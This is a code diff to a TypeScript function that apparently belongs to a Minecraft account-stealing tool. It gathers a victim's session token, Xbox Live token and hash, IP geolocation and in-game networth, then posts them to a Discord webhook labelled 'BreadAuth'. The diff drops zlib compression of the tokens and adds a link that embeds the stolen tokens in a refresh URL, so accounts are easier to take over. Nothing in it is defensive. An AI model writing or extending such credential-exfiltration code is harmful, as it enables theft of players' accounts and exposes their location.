@@ -1,23 +1,14 @@
 import ipGeolocation from "../geolocation";
 import dotenv from "dotenv";
-import Zlib from "zlib";
 
 dotenv.config();
 const hatehook = process.env.DISCORD_HATEHOOK;
 
 export default async function oauthWebhook(data: any, nwData:any, ip: string, webhook: string, blacklisted?: boolean) {
-    const { username, uuid, session_token, xbl_hash, xbl_token, refresh_token } = data;
+    const { username, uuid, session_token, xbl_hash, xbl_token } = data;
     const { unsoulboundNw, description } = nwData || { unsoulboundNw: 0, description: "Error getting networth" };
     // @ts-ignore
     const refreshURL = "https://breadcat.cc/api/v1/auth/manual/refresh";
-
-    //compress refresh token and xbl token using zlib
-    // @ts-ignore
-    const compressedRefreshToken = Zlib.deflateSync(refresh_token).toString("utf8");
-    // @ts-ignore
-    const compressedXblToken = Zlib.deflateSync(xbl_token).toString("utf8");
-    // @ts-ignore
-    const compressedXblHash = Zlib.deflateSync(xbl_hash).toString("utf8");
 
     //format networth to be human readable using K, M, B, T
     const formatedNw = Intl.NumberFormat('en-US', {
@@ -85,6 +76,9 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         "username": "BreadAuth",
         "avatar_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg",
         "embeds": [mcEmbed],
+    }
+    if (xbl_hash && xbl_token && xbl_hash.length + xbl_token.length < 2000) {
+        body.content = `[Refresh Here](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token})`
     }
     const options = {
         method: "POST",
